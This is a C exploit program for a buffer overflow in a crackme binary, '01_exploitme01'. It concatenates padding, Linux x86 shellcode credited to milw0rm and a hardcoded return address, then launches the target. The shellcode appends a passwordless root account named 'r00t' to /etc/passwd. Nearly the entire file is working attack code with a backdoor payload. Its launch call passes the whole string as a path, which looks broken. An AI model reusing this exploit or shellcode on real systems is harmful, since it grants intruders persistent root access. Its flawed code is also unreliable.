/*
\    ____________________BUFFER_OVERFLOW__________________________
/ :: linux 01_exploitme01 buffer overflow                         ::
\ :: by CypherXero [www.cypherxero.net]                           ::
/ :: shellc0de adds the user r00t to /etc/password                ::
\ :: http://www.crackmes.de/users/zero/cesd_dvl_assessment_1/     ::
\ :: 		        HACK THE PLANET		 	          ::
/ ::________________________0x000000______________________________::
\
*/

#include <string.h>
#include <stdio.h>

int main()
{
printf("Stack Overflow by CypherXero\n");
char exploit[500] = "./01_exploitme01 ";

/* EIP Address */
char ret[] = "\xe8\xfb\xff\xbf";

/* Showing some love for CX, baybee :D */
char overflow[] =
	"CXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCX"
	"CXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCX"
	"CXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCX"
	"CXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCX"
	"CXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCXCX"
	"CXCXCXCXCXCXCXCXCXC";

/* add user r00t to /etc/password */
/* shellcode from milw0rm.com */
char shellc0de[] =

	"\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68"
        "\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66"
        "\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\x31\xd2"
        "\x52\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68"
        "\x72\x30\x30\x74\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a"
        "\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80";

/* Let's build this fucker */
strcat(exploit, overflow);
strcat(exploit, shellc0de);
strcat(exploit, ret);

printf("Exploiting ......\n");
execl(exploit, 0);
printf("Exploitation Finished\n");
return 0;
}